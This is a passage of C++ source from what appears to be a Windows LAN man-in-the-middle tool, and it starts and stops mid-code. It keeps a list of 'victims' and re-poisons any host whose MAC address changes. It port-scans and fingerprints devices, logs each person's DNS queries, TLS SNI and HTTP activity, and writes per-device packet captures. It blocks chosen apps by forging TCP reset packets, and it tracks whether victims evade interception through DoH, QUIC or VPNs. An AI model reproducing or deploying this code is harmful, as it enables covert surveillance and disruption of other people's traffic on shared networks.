        {"C0:FF:D4", "Netgear"}, {"E0:91:F5", "Netgear"}, {"00:0B:86", "ASUS"},
        {"00:15:F2", "ASUS"}, {"00:17:31", "ASUS"}, {"00:1A:92", "ASUS"},
        {"00:1B:FC", "ASUS"}, {"00:1D:60", "ASUS"}, {"00:1E:8C", "ASUS"},
        {"00:1F:C6", "ASUS"}, {"00:22:15", "ASUS"}, {"00:23:54", "ASUS"},
        {"00:24:8C", "ASUS"}, {"00:26:18", "ASUS"}, {"04:D9:F5", "ASUS"},
        {"08:60:6E", "ASUS"}, {"10:7B:44", "ASUS"}, {"10:BF:48", "ASUS"},
        {"14:DD:A9", "ASUS"}, {"1C:87:2C", "ASUS"}, {"24:4B:FE", "ASUS"},
        {"2C:56:DC", "ASUS"}, {"30:5A:3A", "ASUS"}, {"38:2C:4A", "ASUS"},
        {"38:D5:47", "ASUS"}, {"40:16:7E", "ASUS"}, {"50:46:5D", "ASUS"},
        {"54:A0:50", "ASUS"}, {"60:45:CB", "ASUS"}, {"60:A4:4C", "ASUS"},
        {"70:4D:7B", "ASUS"}, {"74:D0:2B", "ASUS"}, {"78:24:AF", "ASUS"},
        {"7C:10:C9", "ASUS"}, {"88:D7:F6", "ASUS"}, {"90:E6:BA", "ASUS"},
        {"AC:22:0B", "ASUS"}, {"AC:9E:17", "ASUS"}, {"B0:6E:BF", "ASUS"},
        {"BC:EE:7B", "ASUS"}, {"C8:60:00", "ASUS"}, {"D0:17:C2", "ASUS"},
        {"D8:50:E6", "ASUS"}, {"E0:3F:49", "ASUS"}, {"E0:CB:4E", "ASUS"},
        {"F0:2F:74", "ASUS"}, {"F4:6D:04", "ASUS"}, {"F8:32:E4", "ASUS"},
        {"00:1A:79", "Xiaomi"}, {"04:CF:8C", "Xiaomi"}, {"0C:1D:AF", "Xiaomi"},
        {"14:F6:5A", "Xiaomi"}, {"18:5F:26", "Xiaomi"}, {"28:6C:07", "Xiaomi"},
        {"34:80:B3", "Xiaomi"}, {"34:CE:00", "Xiaomi"}, {"50:64:2B", "Xiaomi"},
        {"64:09:80", "Xiaomi"}, {"64:90:C1", "Xiaomi"}, {"68:DF:DD", "Xiaomi"},
        {"74:51:BA", "Xiaomi"}, {"7C:49:EB", "Xiaomi"}, {"8C:BE:BE", "Xiaomi"},
        {"9C:99:A0", "Xiaomi"}, {"A0:86:C6", "Xiaomi"}, {"A4:C1:38", "Xiaomi"},
        {"AC:C1:EE", "Xiaomi"}, {"B0:D5:9D", "Xiaomi"}, {"C4:0B:CB", "Xiaomi"},
        {"C8:D3:A3", "Xiaomi"}, {"CC:44:63", "Xiaomi"}, {"D4:97:0B", "Xiaomi"},
        {"DC:44:27", "Xiaomi"}, {"F0:B4:29", "Xiaomi"}, {"F8:A4:5F", "Xiaomi"},
        {"00:1E:42", "Huawei"}, {"00:25:9E", "Huawei"}, {"00:46:4B", "Huawei"},
        {"00:E0:FC", "Huawei"}, {"04:02:1F", "Huawei"}, {"04:C6:97", "Huawei"},
        {"08:18:1E", "Huawei"}, {"0C:96:CC", "Huawei"}, {"10:1B:54", "Huawei"},
        {"10:47:80", "Huawei"}, {"14:20:5E", "Huawei"}, {"18:55:0F", "Huawei"},
        {"1C:1D:67", "Huawei"}, {"20:3E:3E", "Huawei"}, {"24:09:95", "Huawei"},
        {"28:31:52", "Huawei"}, {"28:6E:D4", "Huawei"}, {"2C:AB:25", "Huawei"},
        {"30:D1:7E", "Huawei"}, {"34:00:A3", "Huawei"}, {"38:46:08", "Huawei"},
        {"38:94:9A", "Huawei"}, {"38:BC:0D", "Huawei"}, {"38:F8:8A", "Huawei"},
        {"44:6E:57", "Huawei"}, {"48:46:FB", "Huawei"}, {"4C:1F:CC", "Huawei"},
        {"50:01:D9", "Huawei"}, {"54:89:98", "Huawei"}, {"58:48:22", "Huawei"},
        {"5C:A4:8A", "Huawei"}, {"60:05:74", "Huawei"}, {"64:3E:8C", "Huawei"},
        {"68:27:37", "Huawei"}, {"6C:E8:73", "Huawei"}, {"70:72:3C", "Huawei"},
        {"74:A5:28", "Huawei"}, {"78:E8:B7", "Huawei"}, {"7C:1E:52", "Huawei"},
        {"80:91:33", "Huawei"}, {"84:A8:E4", "Huawei"}, {"88:53:2E", "Huawei"},
        {"88:E3:AB", "Huawei"}, {"8C:34:FD", "Huawei"}, {"90:0E:84", "Huawei"},
        {"94:D4:69", "Huawei"}, {"98:FA:9B", "Huawei"}, {"9C:28:BF", "Huawei"},
        {"A0:D0:DC", "Huawei"}, {"A4:23:05", "Huawei"}, {"A8:2B:B6", "Huawei"},
        {"AC:E2:D3", "Huawei"}, {"B4:CD:27", "Huawei"}, {"B8:17:C2", "Huawei"},
        {"BC:32:5F", "Huawei"}, {"C0:4A:00", "Huawei"}, {"C4:07:2F", "Huawei"},
        {"C8:94:02", "Huawei"}, {"CC:A2:23", "Huawei"}, {"D0:7A:B5", "Huawei"},
        {"D4:6A:A8", "Huawei"}, {"D8:49:0B", "Huawei"}, {"DC:D9:16", "Huawei"},
        {"E0:24:7F", "Huawei"}, {"E4:46:DA", "Huawei"}, {"E8:CD:2D", "Huawei"},
        {"EC:CB:30", "Huawei"}, {"F0:7D:68", "Huawei"}, {"F4:6B:EF", "Huawei"},
        {"F8:4A:BF", "Huawei"}, {"FC:48:EF", "Huawei"}, {"00:14:6C", "Amazon"},
        {"00:FC:8B", "Amazon"}, {"0C:47:C9", "Amazon"}, {"18:74:2E", "Amazon"},
        {"34:D2:70", "Amazon"}, {"40:B4:CD", "Amazon"}, {"44:65:0D", "Amazon"},
        {"50:DC:E7", "Amazon"}, {"68:37:E9", "Amazon"}, {"68:54:FD", "Amazon"},
        {"74:75:48", "Amazon"}, {"74:C2:46", "Amazon"}, {"84:D6:D0", "Amazon"},
        {"A0:02:DC", "Amazon"}, {"AC:63:BE", "Amazon"}, {"B4:7C:9C", "Amazon"},
        {"F0:27:2D", "Amazon"}, {"F0:81:73", "Amazon"}, {"FC:65:DE", "Amazon"},
        {"00:04:20", "Sony"}, {"00:0E:07", "Sony"}, {"00:13:15", "Sony"},
        {"00:19:C5", "Sony"}, {"00:1A:80", "Sony"}, {"00:1D:BA", "Sony"},
        {"00:1F:A7", "Sony"}, {"00:24:8D", "Sony"}, {"04:5D:4B", "Sony"},
        {"08:00:46", "Sony"}, {"28:0D:FC", "Sony"}, {"2C:76:8A", "Sony"},
        {"34:BD:3B", "Sony"}, {"38:8B:59", "Sony"}, {"40:BD:32", "Sony"},
        {"54:53:ED", "Sony"}, {"58:48:22", "Sony"}, {"70:9E:29", "Sony"},
        {"78:84:3C", "Sony"}, {"98:D6:F7", "Sony"}, {"A8:E3:EE", "Sony"},
        {"AC:9B:0A", "Sony"}, {"B0:05:94", "Sony"}, {"C0:89:03", "Sony"},
        {"D0:27:88", "Sony"}, {"FC:0F:E6", "Sony"}, {"00:09:BF", "Nintendo"},
        {"00:17:AB", "Nintendo"}, {"00:19:FD", "Nintendo"}, {"00:1A:E9", "Nintendo"},
        {"00:1B:7A", "Nintendo"}, {"00:1E:36", "Nintendo"}, {"00:21:47", "Nintendo"},
        {"00:22:AA", "Nintendo"}, {"00:22:D7", "Nintendo"}, {"00:23:CC", "Nintendo"},
        {"00:24:1E", "Nintendo"}, {"00:24:44", "Nintendo"}, {"00:25:A0", "Nintendo"},
        {"00:26:59", "Nintendo"}, {"04:03:D6", "Nintendo"}, {"2C:10:C1", "Nintendo"},
        {"34:AF:2C", "Nintendo"}, {"40:F4:07", "Nintendo"}, {"58:2F:40", "Nintendo"},
        {"58:BD:A3", "Nintendo"}, {"78:A2:A0", "Nintendo"}, {"7C:BB:8A", "Nintendo"},
        {"98:B6:E9", "Nintendo"}, {"98:E8:FA", "Nintendo"}, {"A4:5C:27", "Nintendo"},
        {"B8:78:2E", "Nintendo"}, {"B8:8A:EC", "Nintendo"}, {"C0:56:E3", "Nintendo"},
        {"CC:9E:00", "Nintendo"}, {"D8:6B:F7", "Nintendo"}, {"E8:4E:CE", "Nintendo"},
        {"00:1A:70", "Nest"}, {"64:16:66", "Nest"}, {"18:B4:30", "Nest"},
        {"20:DF:B9", "Nest"}, {"30:8C:FB", "Nest"}, {"64:16:66", "Nest"},
        {nullptr, nullptr}
    };
    if (!mac || strlen(mac) < 8) return nullptr;
    char prefix[9];
    snprintf(prefix, sizeof(prefix), "%.2s:%.2s:%.2s",
             mac, mac+3, mac+6);
    for (int i = 0; table[i].oui; ++i) {
        if (stricmp(table[i].oui, prefix) == 0) return table[i].name;
    }
    return nullptr;
}

static bool learnVictim(const std::string& ip, const std::string& mac) {
    if (ip.empty() || mac.empty()) return false;
    unsigned char om[6];
    if (parseMac(mac, om)) {
        if (macEq(om, g_myMac)) return false;
        // broadcast / multicast addresses are not devices.  The neighbour
        // table contains 192.168.0.255 -> ff:ff:ff:ff:ff:ff and it used to end
        // up in the device list (and in "t all"), which made a poison or flood
        // hit the whole LAN instead of one host.
        if (macZero(om) || (om[0] & 1)) return false;
    }
    if (ip == g_myIp) return false;

    std::string changedFrom;
    bool isNew = false;
    {
        std::lock_guard<std::mutex> lk(g_vmutex);
        bool found = false;
        for (auto& v : g_victims) {
            if (v.ip == ip) {
                // same IP, different MAC: the device reconnected, was
                // replaced, or its IP was handed to someone else. Re-poison
                // against the new MAC so the MITM does not silently drop.
                if (!v.mac.empty() && stricmp(v.mac.c_str(), mac.c_str()) != 0)
                    changedFrom = v.mac;
                v.mac = mac;
                v.lastSeen = GetTickCount();
                found = true;
                break;
            }
        }
        if (!found) {
            Victim v; v.ip = ip; v.mac = mac; v.lastSeen = GetTickCount();
            const char* vendor = ouiVendor(mac.c_str());
            if (vendor) { v.name = vendor; v.namePrio = 0; }
            g_victims.push_back(v);
            isNew = true;
        }
        refreshVictimIpSnapLocked();
    }
    // a manual name always wins, even for a host discovered after it was set
    {
        std::string mn = manualNameFor(ip);
        if (!mn.empty()) {
            std::lock_guard<std::mutex> lk(g_vmutex);
            for (auto& v : g_victims)
                if (v.ip == ip) { v.name = mn; v.namePrio = 9; break; }
        }
    }
    if (!changedFrom.empty()) {
        PF("[!] %s moved to a new MAC: %s -> %s (re-poisoning)\n",
           ip.c_str(), changedFrom.c_str(), mac.c_str());
        if (attackOn) g_repoisonNow = true;
    }
    return isNew;
}

static bool victimMac(const std::string& ip, unsigned char* out) {
    {
        std::lock_guard<std::mutex> lk(g_vmutex);
        for (auto& v : g_victims)
            if (v.ip == ip) { parseMac(v.mac, out); return true; }
    }
    return getMacFromArpCache(ip.c_str(), out);
}

static std::string victimName(const std::string& ip) {
    std::lock_guard<std::mutex> lk(g_vmutex);
    for (auto& v : g_victims)
        if (v.ip == ip && !v.name.empty()) return v.name;
    return "-";
}

static int victimNamePrio(const std::string& ip) {
    std::lock_guard<std::mutex> lk(g_vmutex);
    for (auto& v : g_victims)
        if (v.ip == ip) return v.namePrio;
    return -1;
}

// ---------------------------------------------------------------
// service fingerprinting: TCP connect scan + light banner grab
// ---------------------------------------------------------------
static std::atomic<int> g_fpActive{0};

static bool tcpPortOpen(const std::string& ip, int port, int timeoutMs) {
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return false;
    u_long nb = 1;
    ioctlsocket(s, FIONBIO, &nb);
    sockaddr_in a{};
    a.sin_family = AF_INET;
    a.sin_port   = htons((u_short)port);
    a.sin_addr.s_addr = inet_addr(ip.c_str());
    bool open = false;
    if (connect(s, (sockaddr*)&a, sizeof(a)) == 0) {
        open = true;
    } else if (WSAGetLastError() == WSAEWOULDBLOCK) {
        fd_set wf, ef;
        FD_ZERO(&wf); FD_SET(s, &wf);
        FD_ZERO(&ef); FD_SET(s, &ef);
        timeval tv;
        tv.tv_sec  = timeoutMs / 1000;
        tv.tv_usec = (timeoutMs % 1000) * 1000;
        if (select(0, nullptr, &wf, &ef, &tv) > 0) {
            int err = 0, l = sizeof(err);
            getsockopt(s, SOL_SOCKET, SO_ERROR, (char*)&err, &l);
            open = (err == 0);
        }
    }
    closesocket(s);
    return open;
}

static std::string tcpBanner(const std::string& ip, int port,
                             const std::string& probe, int timeoutMs) {
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return "";
    DWORD tv = (DWORD)timeoutMs;
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&tv, sizeof(tv));
    sockaddr_in a{};
    a.sin_family = AF_INET;
    a.sin_port   = htons((u_short)port);
    a.sin_addr.s_addr = inet_addr(ip.c_str());
    std::string out;
    if (connect(s, (sockaddr*)&a, sizeof(a)) == 0) {
        if (!probe.empty()) ::send(s, probe.data(), (int)probe.size(), 0);
        char buf[256] = {0};
        int n = recv(s, buf, sizeof(buf) - 1, 0);
        if (n > 0) {
            for (int i = 0; i < n; ++i) {
                char c = buf[i];
                if (c == '\r' || c == '\n') break;
                if (c >= 32 && c < 127) out += c;
            }
        }
    }
    closesocket(s);
    return out;
}

static void fingerprintVictim(std::string ip) {
    static const int ports[] = {
        21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 554, 587,
        631, 993, 995, 1723, 3306, 3389, 5000, 5432, 5900, 6379, 8008,
        8009, 8080, 8443, 9100, 5353
    };
    std::string openList;
    bool p22 = false, p80 = false, p443 = false, p53 = false, p135 = false,
         p139 = false, p445 = false, p3389 = false, p8008 = false,
         p8009 = false, p631 = false, p9100 = false, p554 = false;
    for (int port : ports) {
        if (!tcpPortOpen(ip, port, 220)) continue;
        if (!openList.empty()) openList += ",";
        openList += std::to_string(port);
        switch (port) {
            case 22:   p22 = true;   break;
            case 80:   p80 = true;   break;
            case 443:  p443 = true;  break;
            case 53:   p53 = true;   break;
            case 135:  p135 = true;  break;
            case 139:  p139 = true;  break;
            case 445:  p445 = true;  break;
            case 3389: p3389 = true; break;
            case 8008: p8008 = true; break;
            case 8009: p8009 = true; break;
            case 631:  p631 = true;  break;
            case 9100: p9100 = true; break;
            case 554:  p554 = true;  break;
        }
    }

    std::string banner;
    if (p22)        banner = tcpBanner(ip, 22, "", 400);
    else if (p80)   banner = tcpBanner(ip, 80, "HEAD / HTTP/1.0\r\n\r\n", 500);
    else if (p8008) banner = tcpBanner(ip, 8008, "HEAD / HTTP/1.0\r\n\r\n", 500);

    std::string os;
    if (p8008 || p8009)          os = "Google Cast / Android TV";
    else if (p9100 || p631)      os = "Printer";
    else if (p3389 || p135 || p139 || p445) os = "Windows";
    else if (p554)               os = "IP camera / RTSP";
    else if (p22)                os = "Linux/Unix (SSH)";
    else if (p53 || (p80 && p443)) os = "Router/embedded";
    else if (!openList.empty())  os = "host";

    {
        std::lock_guard<std::mutex> lk(g_vmutex);
        for (auto& v : g_victims) {
            if (v.ip != ip) continue;
            v.ports        = openList;
            v.osGuess      = os;
            v.banner       = banner;
            v.fingerprinted = true;
            break;
        }
    }
    std::string extra = banner.empty() ? "" : (" banner=" + banner);
    PF("[+] fingerprint %-15s open=%s os=%s%s\n", ip.c_str(),
       openList.empty() ? "-" : openList.c_str(),
       os.empty() ? "?" : os.c_str(), extra.c_str());
    g_fpActive--;
}

struct Activity {
    std::string                     ip;
    std::string                     mac;
    long                            dnsCount  = 0;
    long                            sniCount  = 0;
    long                            httpCount = 0;
    DWORD                           lastSeen  = 0;
    std::deque<std::string>         recent;
    std::unordered_set<std::string> apps;
    DWORD                           lastPoison = 0;
    unsigned long long              events    = 0;
    FILE*                           capFile   = nullptr;
    unsigned long long              capBytes  = 0;
    bool                            capFull   = false;
    // traffic analytics
    unsigned long long              byUp      = 0;   // bytes this device sent
    unsigned long long              byDown    = 0;   // bytes sent to this device
    unsigned long long              pktUp     = 0;
    unsigned long long              pktDown   = 0;
    std::unordered_map<std::string, long> proto;      // label -> packets
    std::unordered_map<std::string, long> peers;      // peer ip -> packets
    // bypass detection: how this device dodges plain interception
    long                            quic      = 0;    // UDP 443/8443 flows
    long                            doh       = 0;    // DoH provider endpoints
    long                            dot       = 0;    // DNS-over-TLS (853)
    long                            vpn       = 0;    // VPN-ish ports / ip-proto
    long                            dnsDirect = 0;    // DNS to a non-LAN resolver
};

static std::unordered_map<std::string, Activity> g_activity;
static std::mutex                                g_activityMutex;

// detailed traffic view: focus on one device + optional per-device pcap
static std::string        g_focusIp;
static std::mutex         g_focusMutex;
static std::atomic<bool>  g_captureOn{false};

static bool inActivity(const std::string& ip) {
    std::lock_guard<std::mutex> lk(g_activityMutex);
    return g_activity.find(ip) != g_activity.end();
}

// one open append handle per tracked device; opening/closing the log on every
// single DNS/SNI/HTTP event was costing a file open+close per event in the
// capture path, which is why a busy LAN felt sluggish
static std::unordered_map<std::string, FILE*> g_trackFiles;
static std::mutex g_trackFilesMutex;

static FILE* trackFileFor(const std::string& ip) {
    std::lock_guard<std::mutex> lk(g_trackFilesMutex);
    auto it = g_trackFiles.find(ip);
    if (it != g_trackFiles.end()) return it->second;
    char path[MAX_PATH];
    snprintf(path, sizeof(path), "%s\\track_%s.log", TRACK_DIR, ip.c_str());
    FILE* f = fopen(path, "ab");
    if (!f) return nullptr;
    setvbuf(f, nullptr, _IOFBF, 64 * 1024);
    g_trackFiles[ip] = f;
    return f;
}

static void closeTrackFiles() {
    std::lock_guard<std::mutex> lk(g_trackFilesMutex);
    for (auto& kv : g_trackFiles) if (kv.second) fclose(kv.second);
    g_trackFiles.clear();
}

static void closeTrackFile(const std::string& ip) {
    std::lock_guard<std::mutex> lk(g_trackFilesMutex);
    auto it = g_trackFiles.find(ip);
    if (it != g_trackFiles.end()) {
        if (it->second) fclose(it->second);
        g_trackFiles.erase(it);
    }
}

static void trackEvent(const std::string& ip, const std::string& mac,
                       const char* kind, const std::string& detail) {
    std::string line = "[" + tsNow() + "] " + kind + " " + detail;
    unsigned long long ev = 0;
    {
        std::lock_guard<std::mutex> lk(g_activityMutex);
        Activity& a = g_activity[ip];
        a.ip = ip;
        if (!mac.empty() && mac != "00:00:00:00:00:00") a.mac = mac;
        a.lastSeen = GetTickCount();
        a.events++;
        ev = a.events;
        a.recent.push_back(line);
        if (a.recent.size() > RECENT_CAP) a.recent.pop_front();
    }

    FILE* f = trackFileFor(ip);
    if (f) {
        fprintf(f, "%s\n", line.c_str());
        // keep the on-disk log reasonably fresh without flushing every event
        if ((ev & 31) == 0) fflush(f);
    }
}

// ---------------------------------------------------------------
// per-device pcap capture (atk\captures\<ip>.pcap, libpcap format)
// ---------------------------------------------------------------
static FILE* openCapLocked(Activity& a) {
    if (a.capFile) return a.capFile;
    if (a.capFull) return nullptr;
    CreateDirectoryA(CAP_DIR, nullptr);
    char path[MAX_PATH];
    snprintf(path, sizeof(path), "%s\\%s.pcap", CAP_DIR, a.ip.c_str());
    FILE* f = fopen(path, "wb");
    if (!f) return nullptr;
    static const unsigned char gh[24] = {
        0xd4, 0xc3, 0xb2, 0xa1,             // magic (little endian)
        0x02, 0x00, 0x04, 0x00,             // version 2.4
        0x00, 0x00, 0x00, 0x00,             // thiszone
        0x00, 0x00, 0x00, 0x00,             // sigfigs
        0xff, 0xff, 0x00, 0x00,             // snaplen 65535
        0x01, 0x00, 0x00, 0x00              // LINKTYPE_ETHERNET
    };
    if (fwrite(gh, sizeof(gh), 1, f) != 1) { fclose(f); return nullptr; }
    // big buffer: a pcap write per packet with a 4 KB stdio buffer thrashes
    setvbuf(f, nullptr, _IOFBF, 256 * 1024);
    a.capFile  = f;
    a.capBytes = sizeof(gh);
    return f;
}

static void writeCapLocked(const std::string& ip,
                           const struct pcap_pkthdr* h,
                           const unsigned char* p) {
    auto it = g_activity.find(ip);
    if (it == g_activity.end()) return;
    Activity& a = it->second;
    FILE* f = openCapLocked(a);
    if (!f) return;
    uint32_t hdr[4];
    hdr[0] = (uint32_t)h->ts.tv_sec;
    hdr[1] = (uint32_t)h->ts.tv_usec;
    hdr[2] = (uint32_t)h->caplen;
    hdr[3] = (uint32_t)h->len;
    if (fwrite(hdr, sizeof(hdr), 1, f) != 1 ||
        fwrite(p, 1, h->caplen, f) != h->caplen) {
        fclose(f); a.capFile = nullptr; return;
    }
    unsigned long long before = a.capBytes;
    a.capBytes += sizeof(hdr) + h->caplen;
    // flush every ~4 MB so the file is usable while recording, without an
    // fflush per packet
    if ((before ^ a.capBytes) & ~((4ull << 20) - 1)) fflush(f);
    if (a.capBytes >= g_pcapMaxBytes.load()) {
        fclose(f);
        a.capFile = nullptr;
        a.capFull = true;
    }
}

static void recordPacket(const struct pcap_pkthdr* h, const unsigned char* p) {
    if (!g_captureOn.load() || !h || !p) return;
    if (h->caplen < 34) return;
    if (p[12] != 0x08 || p[13] != 0x00) return;   // IPv4 only
    const unsigned char* ip = p + 14;
    int ihl = (ip[0] & 0x0F) * 4;
    if (ihl < 20 || 14 + ihl > (int)h->caplen) return;
    char src[16], dst[16];
    snprintf(src, 16, "%u.%u.%u.%u", ip[12], ip[13], ip[14], ip[15]);
    snprintf(dst, 16, "%u.%u.%u.%u", ip[16], ip[17], ip[18], ip[19]);
    // never record our own machine's traffic
    if (!g_myIp.empty() && (g_myIp == src || g_myIp == dst)) return;

    // a scanned target gets a capture file even before it produces DNS/HTTP
    bool srcKnown = isKnownVictimIp(src);
    bool dstKnown = (strcmp(src, dst) == 0) ? srcKnown : isKnownVictimIp(dst);

    std::lock_guard<std::mutex> lk(g_activityMutex);
    auto ensure = [&](const char* x, bool known) -> bool {
        if (!known) return false;
        if (g_activity.find(x) == g_activity.end()) {
            Activity a;
            a.ip = x;
            a.lastSeen = GetTickCount();
            g_activity.emplace(x, std::move(a));
        }
        return true;
    };
    if (ensure(src, srcKnown)) writeCapLocked(src, h, p);
    if (ensure(dst, dstKnown)) writeCapLocked(dst, h, p);
}

static void closeAllCaptures() {
    std::lock_guard<std::mutex> lk(g_activityMutex);
    for (auto& kv : g_activity) {
        if (kv.second.capFile) {
            fclose(kv.second.capFile);
            kv.second.capFile = nullptr;
        }
    }
}

static void trackedAppSeen(const std::string& victimIp, const std::string& app) {
    if (victimIp.empty() || app.empty()) return;
    std::lock_guard<std::mutex> lk(g_activityMutex);
    auto it = g_activity.find(victimIp);
    if (it == g_activity.end()) return;
    it->second.apps.insert(app);
}

static bool dnsExtractQuery(const unsigned char* dns, int len,
                            std::string& qname, uint16_t& qtype) {
    if (len < 12) return false;
    int pos = 12;
    qname.clear();
    int jumps = 0;
    while (pos < len && jumps < 32) {
        unsigned l = dns[pos];
        if (l == 0) { pos++; break; }
        if ((l & 0xC0) == 0xC0) { pos += 2; break; }
        if (pos + 1 + (int)l > len) return false;
        qname.append((const char*)(dns + pos + 1), l);
        qname += '.';
        pos += 1 + (int)l;
        jumps++;
    }
    while (!qname.empty() && qname.back() == '.') qname.pop_back();
    if (pos + 4 > len) return false;
    qtype = (dns[pos] << 8) | dns[pos + 1];
    return !qname.empty();
}

static bool tlsExtractSni(const unsigned char* tls, int len, std::string& sni) {
    sni.clear();
    if (len < 6) return false;
    if (tls[0] != 0x16) return false;
    if (tls[5] != 0x01) return false;

    int p = 9;
    if (p + 34 > len) return false;
    p += 2 + 32;
    if (p + 1 > len) return false;
    int sidLen = tls[p]; p += 1 + sidLen;
    if (p + 2 > len) return false;
    int csLen = (tls[p] << 8) | tls[p + 1]; p += 2 + csLen;
    if (p + 1 > len) return false;
    int compLen = tls[p]; p += 1 + compLen;
    if (p + 2 > len) return false;

    int extLen = (tls[p] << 8) | tls[p + 1]; p += 2;
    int extEnd = p + extLen;
    if (extEnd > len) extEnd = len;

    while (p + 4 <= extEnd) {
        int etype = (tls[p] << 8) | tls[p + 1];
        int elen  = (tls[p + 2] << 8) | tls[p + 3];
        p += 4;
        if (p + elen > extEnd) break;
        if (etype == 0x0000) {
            int q = p;
            if (q + 2 > p + elen) break;
            int listLen = (tls[q] << 8) | tls[q + 1]; q += 2;
            int listEnd = q + listLen;
            if (listEnd > p + elen) listEnd = p + elen;
            while (q + 3 <= listEnd) {
                int ntype = tls[q];
                int nlen  = (tls[q + 1] << 8) | tls[q + 2];
                q += 3;
                if (q + nlen > listEnd) break;
                if (ntype == 0x00) {
                    sni.assign((const char*)(tls + q), nlen);
                    return !sni.empty();
                }
                q += nlen;
            }
        }
        p += elen;
    }
    return false;
}

struct AppSig {
    std::string              name;
    std::vector<std::string> patterns;
};

static const std::vector<AppSig> g_appSigs = {
    {"tiktok",    {"tiktok.com","tiktokcdn.com","musical.ly","byteoversea","ibytedtos.com"}},
    {"discord",   {"discord.com","discord.gg","discordapp.com","discord.media","discordapp.net"}},
    {"youtube",   {"youtube.com","ytimg.com","googlevideo.com","youtu.be","youtubei"}},
    {"twitter",   {"twitter.com","twimg.com","x.com","t.co"}},
    {"facebook",  {"facebook.com","fbcdn.net","fb.com","fbsbx.com","fb.gg"}},
    {"instagram", {"instagram.com","cdninstagram.com"}},
    {"whatsapp",  {"whatsapp.com","whatsapp.net","wa.me"}},
    {"telegram",  {"telegram.org","t.me","telegram.me","telesco.pe"}},
    {"spotify",   {"spotify.com","scdn.co","spotifycdn.com"}},
    {"netflix",   {"netflix.com","nflxvideo.net","nflximg.net","nflxext.com"}},
    {"roblox",    {"roblox.com","rbxcdn.com","robloxlabs.com"}},
    {"steam",     {"steampowered.com","steamcommunity.com","steamstatic.com","steamcontent.com"}},
    {"riot",      {"riotgames.com","riotcdn.net","leagueoflegends.com"}},
    {"snapchat",  {"snapchat.com","sc-cdn.net","snap.com"}},
    {"twitch",    {"twitch.tv","ttvnw.net","jtvnw.net"}},
    {"reddit",    {"reddit.com","redd.it","redditmedia.com","redditstatic.com"}},
    {"amazon",    {"amazon.com","media-amazon.com","ssl-images-amazon.com"}},
    {"github",    {"github.com","githubusercontent.com","ghcr.io"}},
    {"microsoft", {"microsoft.com","msftconnecttest.com","msftncsi.com","windowsupdate.com","live.com"}},
    {"apple",     {"apple.com","icloud.com","mzstatic.com"}},
};

static std::string appForHost(const std::string& host) {
    if (host.empty()) return "";
    std::string h = toLower(host);
    for (auto& a : g_appSigs)
        for (auto& p : a.patterns)
            if (h.find(p) != std::string::npos) return a.name;
    return "";
}

static const AppSig* findAppSig(const std::string& name) {
    for (auto& a : g_appSigs) if (a.name == name) return &a;
    return nullptr;
}

static std::unordered_map<std::string, std::unordered_set<std::string>> g_blockApp;
static std::mutex                                                       g_blockAppMutex;

static bool appBlocked(const std::string& app, const std::string& victim) {
    if (app.empty()) return false;
    std::lock_guard<std::mutex> lk(g_blockAppMutex);
    auto it = g_blockApp.find(app);
    if (it == g_blockApp.end()) return false;
    return it->second.count("*") || it->second.count(victim);
}

struct Conn {
    std::string cip, sip;
    uint16_t    cport = 0, sport = 0;
    uint32_t    cseq  = 0, cack = 0;
    uint32_t    sseq  = 0, sack = 0;
    DWORD       last  = 0;
    std::string app;
};

static std::unordered_map<std::string, Conn> g_conns;
static std::mutex                            g_connMutex;

static std::string connKey(const std::string& cip, uint16_t cport,
                           const std::string& sip, uint16_t sport) {
    char b[80];
    snprintf(b, sizeof(b), "%s:%u-%s:%u", cip.c_str(), cport, sip.c_str(), sport);
    return std::string(b);
}

static void updateConn(const std::string& cip, uint16_t cport,
                       const std::string& sip, uint16_t sport,
                       bool fromClient,
                       uint32_t seq, uint32_t ack, uint8_t flags,
                       int payloadLen, const std::string& appHint) {
    std::lock_guard<std::mutex> lk(g_connMutex);
    std::string k = connKey(cip, cport, sip, sport);
    Conn& c = g_conns[k];
    c.cip = cip; c.sip = sip;
    c.cport = cport; c.sport = sport;
    c.last = GetTickCount();
    if (!appHint.empty()) c.app = appHint;

    if (fromClient) {
        c.cseq = seq + (uint32_t)payloadLen
               + ((flags & 0x02) ? 1 : 0) + ((flags & 0x01) ? 1 : 0);
        c.cack = ack;
    } else {
        c.sseq = seq + (uint32_t)payloadLen
               + ((flags & 0x02) ? 1 : 0) + ((flags & 0x01) ? 1 : 0);
        c.sack = ack;
    }

    if (flags & 0x04) g_conns.erase(k);
}

static uint16_t checksum16(const unsigned char* d, int len) {
    uint32_t s = 0;
    for (int i = 0; i < len; i += 2) {
        uint16_t w = (d[i] << 8) | ((i + 1 < len) ? d[i + 1] : 0);
        s += w;
    }
    while (s >> 16) s = (s & 0xFFFF) + (s >> 16);
    return (uint16_t)~s;
}

static void sendTcpRst(const unsigned char* dstMac, const unsigned char* srcMac,
                       uint32_t srcIp, uint32_t dstIp,
                       uint16_t srcPort, uint16_t dstPort,
                       uint32_t seq, uint32_t ack) {
    unsigned char f[14 + 20 + 20] = {0};
    memcpy(&f[0], dstMac, 6);
    memcpy(&f[6], srcMac, 6);
    f[12] = 0x08; f[13] = 0x00;

    unsigned char* ip = &f[14];
    ip[0] = 0x45;
    ip[2] = 0x00; ip[3] = 0x28;
    ip[4] = (rnd16() >> 8) & 0xFF;
    ip[5] = rnd16() & 0xFF;
    ip[6] = 0x40;
    ip[8] = 64;   ip[9] = 6;
    memcpy(&ip[12], &srcIp, 4);
    memcpy(&ip[16], &dstIp, 4);
    uint16_t ic = checksum16(ip, 20);
    ip[10] = ic >> 8; ip[11] = ic & 0xFF;

    unsigned char* tcp = ip + 20;
    tcp[0] = (srcPort >> 8) & 0xFF; tcp[1] = srcPort & 0xFF;
    tcp[2] = (dstPort >> 8) & 0xFF; tcp[3] = dstPort & 0xFF;
    tcp[4] = (seq >> 24) & 0xFF; tcp[5] = (seq >> 16) & 0xFF;
    tcp[6] = (seq >> 8)  & 0xFF; tcp[7] = seq & 0xFF;
    tcp[8] = (ack >> 24) & 0xFF; tcp[9] = (ack >> 16) & 0xFF;
    tcp[10]= (ack >> 8)  & 0xFF; tcp[11]= ack & 0xFF;
    tcp[12] = 0x50;
    tcp[13] = 0x14;

    unsigned char pseudo[12 + 20];
    memcpy(pseudo,     &srcIp, 4);
